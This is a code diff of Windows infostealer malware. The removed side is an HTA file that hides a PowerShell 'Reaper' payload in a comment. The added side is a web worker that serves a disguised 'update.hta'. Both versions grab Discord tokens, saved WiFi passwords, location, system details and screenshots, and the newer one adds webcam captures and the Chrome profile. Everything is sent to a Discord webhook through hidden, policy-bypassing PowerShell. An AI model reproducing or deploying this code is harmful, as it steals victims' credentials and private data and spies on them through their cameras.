@@ -1,164 +1,66 @@
+// This worker intercepts all requests to your domain.
+export default {
+  async fetch(request, env, ctx) {
+    // The HTA payload, stored as a multi-line string.
+    // This is the weapon.
+    const htaPayload = `
 <meta http-equiv="x-ua-compatible" content="ie=edge">
-<hta:application 
-    id="monolith" 
-    applicationname="Monolith" 
-    windowstate="minimize" 
-    showintaskbar="no" 
-    border="none" 
-    caption="no" 
-    sysmenu="no" 
-    scroll="no">
-
-<!--
-The PowerShell payload is stored below, inside an HTML comment block.
-The JScript will extract the content of this block and execute it.
-Do not modify the <payload> or </payload> tags.
-
-<payload>
-# ===================================================
-# DEUS REAPER - Embedded PowerShell Payload v5.0
-# ===================================================
-
-# --- CONFIGURATION ---
-$WebhookURL = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK"
-$BotName = "Monolith Reaper"
-$BotAvatar = "https://i.imgur.com/vWIJwqE.png"
-
-# --- MAIN LOGIC ---
-function Invoke-Reaper {
-    $ErrorActionPreference = "SilentlyContinue"
-
-    # --- Data Collection ---
-    $SystemInfo = @{}
-    $LocationInfo = @{}
-    $DiscordTokens = New-Object System.Collections.ArrayList
-    $WifiPasswords = New-Object System.Collections.ArrayList
-
-    # Get Location & IP Info
-    try {
-        $LocationData = Invoke-RestMethod -Uri "https://ipinfo.io/json" -UseBasicParsing
-        $LocationInfo = @{
-            IP = $LocationData.ip
-            City = $LocationData.city
-            Region = $LocationData.region
-            Country = $LocationData.country
-            ISP = $LocationData.org
-            MapLink = "https://www.google.com/maps/search/?api=1&query=$($LocationData.loc)"
-        }
-    } catch {}
-
-    # Get System Info
-    try {
-        $ComputerInfo = Get-ComputerInfo
-        $SystemInfo = @{
-            Username = $env:USERNAME
-            ComputerName = $env:COMPUTERNAME
-            OS = $ComputerInfo.OsName
-            RAM = "$([Math]::Round($ComputerInfo.TotalPhysicalMemory / 1GB)) GB"
-            CPU = (Get-WmiObject -Class Win32_Processor).Name
-            GPU = (Get-WmiObject -Class Win32_VideoController).Name
-        }
-    } catch {}
-
-    # Get Discord Tokens
-    try {
-        $Paths = @("$env:APPDATA\discord\Local Storage\leveldb", "$env:APPDATA\discordcanary\Local Storage\leveldb", "$env:APPDATA\discordptb\Local Storage\leveldb", "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb", "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb")
-        $Regex = '([a-zA-Z0-9_]{24}\.[a-zA-Z0-9_]{6}\.[a-zA-Z0-9_]{27}|mfa\.[a-zA-Z0-9_-]{84})'
-        foreach ($Path in $Paths) {
-            if (Test-Path $Path) {
-                (Get-ChildItem -Path $Path -Filter *.ldb -File).FullName | ForEach-Object {
-                    (Select-String -Path $_ -Pattern $Regex).Matches.Value | ForEach-Object {
-                        if ($_.Trim() -ne "" -and !$DiscordTokens.Contains($_)) {
-                            [void]$DiscordTokens.Add($_)
-                        }
-                    }
-                }
-            }
-        }
-    } catch {}
-
-    # Get WiFi Passwords
-    try {
-        ((netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(':')[1].Trim() }) | ForEach-Object {
-            $SSID = $_
-            $Password = ((netsh wlan show profile name="$SSID" key=clear) | Select-String "Key Content").ToString().Split(':')[1].Trim()
-            if ($Password) {
-                [void]$WifiPasswords.Add(@{ SSID = $SSID; Password = $Password })
-            }
-        }
-    } catch {}
-    
-    # Take Screenshot
-    $ScreenshotPath = "$env:TEMP\sys_capture.jpg"
-    try {
-        Add-Type -AssemblyName System.Drawing
-        Add-Type -AssemblyName System.Windows.Forms
-        $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-        $Bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
-        $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
-        $Graphics.CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $Screen.Size)
-        $Bitmap.Save($ScreenshotPath, [System.Drawing.Imaging.ImageFormat]::Jpeg)
-    } catch {}
-
-    # --- Send Payloads ---
-    function Send-Embed {
-        param($Embed)
-        $Payload = @{ username = $BotName; avatar_url = $BotAvatar; embeds = @($Embed) } | ConvertTo-Json -Depth 5
-        Invoke-RestMethod -Uri $WebhookURL -Method Post -ContentType "application/json" -Body $Payload -UseBasicParsing
-    }
-
-    $MainEmbed = @{
-        title = "💀 Monolith Strike: $($SystemInfo.Username)@$($SystemInfo.ComputerName)"
-        color = 16711680
-        description = "**[Open Approx. Location]($($LocationInfo.MapLink))**"
-        fields = @(@{ name = "IP Address"; value = "```$($LocationInfo.IP)```"; inline = $true }, @{ name = "Location"; value = "```$($LocationInfo.City), $($LocationInfo.Country)```"; inline = $true }, @{ name = "ISP"; value = "```$($LocationInfo.ISP)```"; inline = $true }, @{ name = "OS / RAM"; value = "```$($SystemInfo.OS) / $($SystemInfo.RAM)```"; inline = $false }, @{ name = "CPU"; value = "```$($SystemInfo.CPU)```"; inline = $false }, @{ name = "GPU"; value = "```$($SystemInfo.GPU)```"; inline = $false })
-        timestamp = (Get-Date).ToUniversalTime().ToString("o")
-    }
-    Send-Embed -Embed $MainEmbed
-
-    $TokensText = if ($DiscordTokens) { $DiscordTokens -join "`n" } else { "None found." }
-    $WifiText = if ($WifiPasswords) { ($WifiPasswords | ForEach-Object { "SSID: $($_.SSID)`nPass: $($_.Password)" }) -join "`n`n" } else { "None found." }
-    $CredsEmbed = @{
-        title = "🔑 Credentials & Networks"
-        color = 16776960
-        description = "**Discord Tokens:**`n``````$($TokensText.Substring(0, [System.Math]::Min(1000, $TokensText.Length)))```````n**WiFi Passwords:**`n``````$($WifiText.Substring(0, [System.Math]::Min(2000, $WifiText.Length)))``````"
-    }
-    Send-Embed -Embed $CredsEmbed
-
-    # Send Screenshot
-    if (Test-Path $ScreenshotPath) {
-        try { Invoke-RestMethod -Uri $WebhookURL -Method Post -InFile $ScreenshotPath -ContentType "multipart/form-data" } catch {}
-        Remove-Item -Path $ScreenshotPath -Force
-    }
-}
-Invoke-Reaper
-</payload>
-
--->
-
+<hta:application id="omega" applicationname="IndexerService" border="none" caption="no" contextmenu="no" maximizebutton="no" minimizebutton="no" scroll="no" showintaskbar="no" singleinstance="yes" sysmenu="no" windowstate="minimize">
 <script language="JScript">
+(function(){
     try {
-        var htaContent = document.documentElement.innerHTML;
-        var payloadStart = htaContent.indexOf("<payload>") + "<payload>".length;
-        var payloadEnd = htaContent.indexOf("</payload>");
-        var psScript = htaContent.substring(payloadStart, payloadEnd).trim();
+        var shell = new ActiveXObject("WScript.Shell");
+        var fso = new ActiveXObject("Scripting.FileSystemObject");
+        var env = shell.ExpandEnvironmentStrings;
+        var webhook = "YOUR_DISCORD_WEBHOOK_URL_GOES_HERE";
+        var tempPath = env("%TEMP%");
+        
+        // --- Core Payload ---
+        var psScript =
+        "Add-Type -AssemblyName System.Drawing, System.Windows.Forms, Microsoft.VisualBasic;" +
+        "$ErrorActionPreference = 'SilentlyContinue';" +
+        "$Webhook = '" + webhook + "';" +
+        "$BotName = 'Omega Strain';" +
+        "$BotAvatar = 'https://i.imgur.com/g63Mu0x.png';" +
+        // Function to send embeds
+        "function Send-Embed { param($Embed) $Payload = @{ username = $BotName; avatar_url = $BotAvatar; embeds = @($Embed) } | ConvertTo-Json -Depth 10; Invoke-RestMethod -Uri $Webhook -Method Post -ContentType 'application/json' -Body $Payload -UseBasicParsing; };" +
+        // Sys Info
+        "$ipInfo = Invoke-RestMethod -Uri 'http://ip-api.com/json/'; " +
+        "$cpu = (Get-WmiObject -Class Win32_Processor).Name; $gpu = (Get-WmiObject -Class Win32_VideoController).Name; $ram = \\\"$([Math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB)) GB\\\";" +
+        "$mainEmbed = @{ title = ('💀 Omega Infection: ' + $env:USERNAME + '@' + $env:COMPUTERNAME); color = 16711680; description = ('**[Map Link](https://www.google.com/maps/search/?api=1&query=' + $ipInfo.lat + ',' + $ipInfo.lon + ')**'); fields = @(@{ name = 'IP / ISP'; value = ('```' + $ipInfo.query + ' / ' + $ipInfo.isp + '```'); inline = $false }, @{ name = 'Location'; value = ('```' + $ipInfo.city + ', ' + $ipInfo.regionName + ', ' + $ipInfo.country + '```'); inline = $false }, @{ name = 'System'; value = ('```OS: ' + (Get-WmiObject -Class Win32_OperatingSystem).Caption + '\\nCPU: ' + $cpu + '\\nGPU: ' + $gpu + '\\nRAM: ' + $ram + '```'); inline = $false }); };" +
+        "Send-Embed -Embed $mainEmbed;" +
+        // Discord Tokens
+        "$tokens = ''; $paths = @($env:APPDATA + '\\discord\\Local Storage\\leveldb', $env:APPDATA + '\\discordcanary\\Local Storage\\leveldb', $env:LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb'); foreach($path in $paths){ if(Test-Path $path){ Get-ChildItem -Path $path -Filter '*.ldb' | ForEach-Object { $tokens += (Select-String -Path $_.FullName -Pattern '([a-zA-Z0-9_]{24}\\.[a-zA-Z0-9_]{6}\\.[a-zA-Z0-9_]{27}|mfa\\.[a-zA-Z0-9_-]{84})').Matches.Value + '\\n' } } };" +
+        // WiFi
+        "$wifi = ''; ((netsh wlan show profiles) | Select-String 'All User Profile' | %{$_.ToString().Split(':')[1].Trim()}) | %{$ssid=$_; $pass=((netsh wlan show profile name=\\\"$ssid\\\" key=clear) | Select-String 'Key Content').ToString().Split(':')[1].Trim(); if($pass){ $wifi += ('SSID: ' + $ssid + '\\nPass: ' + $pass + '\\n\\n') } };" +
+        // Credentials Embed
+        "$credsEmbed = @{ title = '🔑 Credentials & Networks'; color = 16776960; description = ('**Discord Tokens:**\\n```' + $tokens + '```\\n**WiFi Passwords:**\\n```' + $wifi + '```') };" +
+        "Send-Embed -Embed $credsEmbed;" +
+        // Screenshot & Webcam
+        "$ssPath = $env:TEMP + '\\ss.jpg'; [System.Windows.Forms.Screen]::AllScreens | %{ $bmp = New-Object System.Drawing.Bitmap $_.Bounds.Width, $_.Bounds.Height; $gfx = [System.Drawing.Graphics]::FromImage($bmp); $gfx.CopyFromScreen($_.Bounds.Location, [System.Drawing.Point]::Empty, $bmp.Size); $bmp.Save($ssPath, 'Jpeg') };" +
+        "$camPath = $env:TEMP + '\\cam.jpg'; try{ $c = New-Object Microsoft.VisualBasic.Devices.Computer; $c.Camera.CaptureImage($camPath) }catch{};" +
+        // File Uploads
+        "if(Test-Path $ssPath){ try{ Invoke-RestMethod -Uri $Webhook -Method Post -InFile $ssPath }catch{}; Remove-Item $ssPath -Force; };" +
+        "if(Test-Path $camPath){ try{ Invoke-RestMethod -Uri $Webhook -Method Post -InFile $camPath }catch{}; Remove-Item $camPath -Force; };" +
+        // Browser Data - Grab the files for offline analysis
+        "$zipPath = $env:TEMP + '\\browser_data.zip'; $chromePath = $env:LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Default'; if(Test-Path $chromePath){ Add-Type -AssemblyName System.IO.Compression.FileSystem; try{[System.IO.Compression.ZipFile]::CreateFromDirectory($chromePath, $zipPath, 'Optimal', $false)}catch{} };" +
+        "if(Test-Path $zipPath){ try{ Invoke-RestMethod -Uri $Webhook -Method Post -InFile $zipPath }catch{}; Remove-Item $zipPath -Force; }";
 
-        // Base64 encode the script to avoid any issues with special characters in the command line
-        var b64Script = toBase64(psScript);
-
+        // Base64 encode the monster script.
+        var b64Script = Buffer.from(psScript).toString('base64');
         var command = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand " + b64Script;
-        new ActiveXObject("WScript.Shell").Run(command, 0, false);
-    } catch(e) {}
-    
-    // Base64 encoding function for JScript
-    function toBase64(str) {
-        var a = new ActiveXObject("System.Text.UTF8Encoding").GetBytes_4(str);
-        var b = new ActiveXObject("MSXML2.DOMDocument").createElement("tmp");
-        b.dataType = "bin.base64";
-        b.nodeTypedValue = a;
-        return b.text.replace(/\n/g, "");
-    }
+        
+        // The minimal JScript launcher.
+        var jscript = "try{ new ActiveXObject('WScript.Shell').Run('" + command.replace(/'/g, "\\'") + "', 0, false); }catch(e){} window.close();";
+        
+        var finalHta = htaPayload.replace('</script>', jscript + '</script>');
 
-    window.close();
-</script>
-</html>
+        // Create the response with the magic header.
+        return new Response(finalHta, {
+            headers: {
+                'Content-Type': 'application/hta',
+                'Content-Disposition': 'attachment; filename="update.hta"' // Suggests a filename
+            },
+        });
+    },
+};
